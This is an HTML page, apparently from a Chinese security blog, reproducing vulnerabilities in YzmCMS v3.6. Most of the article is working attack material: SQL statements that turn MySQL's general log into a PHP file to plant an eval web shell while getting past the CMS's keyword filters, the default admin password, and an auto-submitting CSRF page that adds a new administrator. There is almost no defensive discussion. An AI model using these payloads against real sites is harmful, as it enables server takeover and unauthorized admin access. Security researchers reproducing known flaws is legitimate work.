@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="YzmCMS v3.6 csrf一、漏洞简介二、漏洞影响YzmCMS v3.6 三、复现过程1、文件位置: &#x2F;application&#x2F;admin&#x2F;controller&#x2F;sql.class.php第10-42行中： public function init() &amp;#123;       if(isset($_POST[&#39;sqlstr&#39;]))&amp;#123;           if(!C">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/YzmCMS/YzmCMS%20v3.6%20csrf/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="YzmCMS v3.6 csrf一、漏洞简介二、漏洞影响YzmCMS v3.6 三、复现过程1、文件位置: &#x2F;application&#x2F;admin&#x2F;controller&#x2F;sql.class.php第10-42行中： public function init() &amp;#123;       if(isset($_POST[&#39;sqlstr&#39;]))&amp;#123;           if(!C">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:08.745Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-YzmCMS/YzmCMS v3.6 csrf" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/YzmCMS/YzmCMS%20v3.6%20csrf/" class="article-date">
+  <time datetime="2022-07-08T06:26:08.745Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="YzmCMS-v3-6-csrf"><a href="#YzmCMS-v3-6-csrf" class="headerlink" title="YzmCMS v3.6 csrf"></a>YzmCMS v3.6 csrf</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>YzmCMS v3.6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>1、文件位置: /application/admin/controller/sql.class.php第10-42行中：</p>
+<pre><code>public function init() &#123;  
+    if(isset($_POST[&#39;sqlstr&#39;]))&#123;  
+        if(!C(&#39;sql_execute&#39;)) showmsg(&#39;根据系统配置，不允许在线执行SQL命令！&#39;, &#39;stop&#39;);  
+        $sqlstr = MAGIC_QUOTES_GPC ? stripslashes($_POST[&#39;sqlstr&#39;]) : $_POST[&#39;sqlstr&#39;];  
+        $sqlstr = rtrim(trim($sqlstr), &#39;;&#39;);  
+        $sqls = $_POST[&#39;action&#39;]==&#39;many&#39; ? explode(&#39;;&#39;, $sqlstr) : array(0 =&gt; $sqlstr);  
+
+        $admin = D(&#39;admin&#39;);  
+        foreach($sqls as $sql)&#123;  
+10.             if(stristr($sql, &#39;outfile&#39;))&#123;  
+11.                 $str = &#39;&lt;span class=&quot;c-red&quot;&gt;ERROR : 检测到非法字符 “outfile”！&lt;/span&gt;&#39;;  
+12.                 break;  
+13.             &#125;  
+14.             if(stristr($sql, &#39;.php&#39;))&#123;  
+15.                 $str = &#39;&lt;span class=&quot;c-red&quot;&gt;ERROR : 检测到非法字符 “.php” ！&lt;/span&gt;&#39;;  
+16.                 break;  
+17.             &#125;  
+18.             if(preg_match(&quot;/^drop(.*)database/i&quot;, $sql))&#123;  
+19.                 $str = &#39;&lt;span class=&quot;c-red&quot;&gt;ERROR : 不允许删除数据库！&lt;/span&gt;&#39;;  
+20.                 break;  
+21.             &#125;  
+22.             $result = $admin-&gt;query($sql);   
+23.             if($result)&#123;  
+24.                 $str = &#39;&lt;span style=&quot;color:green&quot;&gt;OK : 执行成功！&lt;/span&gt;&#39;;  
+25.                 if(is_object($result) || is_resource($result))&#123;  
+26.                     $arr = $admin-&gt;fetch_all($result);  
+27.                 &#125;                     
+28.             &#125;else&#123;  
+29.                 $str = &#39;&lt;span class=&quot;c-red&quot;&gt;ERROR : 执行失败！&lt;/span&gt;&#39;;  
+30.                 break;  
+31.             &#125;                 
+32.         &#125;  
+33.     &#125;
+</code></pre>
+<p>这段函数中对提交的sql参数进行还原处理，然后进行非法字符检测，检测字符是否存在”oufile”、”.php”,匹配是否有删除数据的操作等。</p>
+<p>2、如何绕过这种限制？</p>
+<p>首页，outfile被禁止，第一时间想到的就是SQL语句利用日志写入文件，但是写入脚本文件”.php”会被检测到非法字符；然后，尝试MySQL中concat函数来连接字符串，拆分’.php’关键词，如<br>CONCAT(&quot;test.&quot;,&quot;php&quot;);最后构造出可以写入文件，绕过非法字符检测的的SQL语句，从而触发代码执行漏洞，控制服务器。</p>
+<p>Payload：</p>
+<pre><code>show variables like &#39;%general%&#39;;   #查看配置
+set global general_log = on;        #开启general log模式
+set global general_log_file =CONCAT(&quot;E:\\study\\WWW\\YzmCMS\\test.&quot;,&quot;php&quot;); 
+select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;;   #写入shell
+</code></pre>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="如何获取后台管理员权限"><a href="#如何获取后台管理员权限" class="headerlink" title="如何获取后台管理员权限"></a>如何获取后台管理员权限</h4><p>有两种思路：</p>
+<p>思路A：通过默认信息，弱口令登录</p>
+<p>默认后台路径：<a target="_blank" rel="noopener" href="http://www.0-sec.org/admin/index/login.html">http://www.0-sec.org/admin/index/login.html</a></p>
+<p>管理员默认账号密码均为：yzmcms</p>
+<p>思路B：通过CSRF漏洞，诱导管理员访问，自动在后台添加管理员账号。</p>
+<p>CSRF漏洞利用代码如下：</p>
+<pre><code>&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;  
+
+&lt;html&gt;  
+&lt;head&gt;  
+&lt;title&gt;OWASP CRSFTester Demonstration&lt;/title&gt;  
+&lt;/head&gt;  
+&lt;body οnlοad=&quot;javascript:fireForms()&quot;&gt;  
+&lt;script language=&quot;JavaScript&quot;&gt;  
+var pauses = new Array( &quot;68&quot; );  
+
+ function pausecomp(millis)  
+
+ &#123;  
+
+     var date = new Date();  
+    var curDate = null;  
+
+     do &#123; curDate = new Date(); &#125;  
+     while(curDate-date &lt; millis);  
+ &#125;  
+
+
+ function fireForms()  
+
+ &#123;  
+
+     var count = 1;  
+     var i=0;  
+
+     for(i=0; i&lt;count; i++)  
+     &#123;  
+         document.forms[i].submit();  
+
+         pausecomp(pauses[i]);  
+     &#125;  
+ &#125;  
+
+
+ &lt;/script&gt;  
+
+ &lt;H2&gt;OWASP CRSFTester Demonstration&lt;/H2&gt;  
+
+ &lt;form method=&quot;POST&quot; name=&quot;form0&quot; action=&quot;http://127.0.0.1:80/admin/admin_manage/add.html&quot;&gt;  
+
+ &lt;input type=&quot;hidden&quot; name=&quot;adminname&quot; value=&quot;admin&quot;/&gt;  
+
+ &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;abc123!&quot;/&gt;  
+
+ &lt;input type=&quot;hidden&quot; name=&quot;password2&quot; value=&quot;abc123!&quot;/&gt;  
+
+ &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;&quot;/&gt;  
+
+ &lt;input type=&quot;hidden&quot; name=&quot;realname&quot; value=&quot;&quot;/&gt;  
+
+ &lt;input type=&quot;hidden&quot; name=&quot;roleid&quot; value=&quot;1&quot;/&gt;  
+
+ &lt;input type=&quot;hidden&quot; name=&quot;dosubmit&quot; value=&quot;1&quot;/&gt;  
+
+ &lt;/form&gt;  
+
+ &lt;/body&gt;  
+
+ &lt;/html&gt;
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/YzmCMS/YzmCMS%20v3.6%20csrf/" data-id="cl5c2qz8q00nqy8v14mb24lgc" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/YzmCMS/YzmCMS%20v3.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/YXcms/%EF%BC%88CVE-2018-11003%EF%BC%89YXcms%201.4.7%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
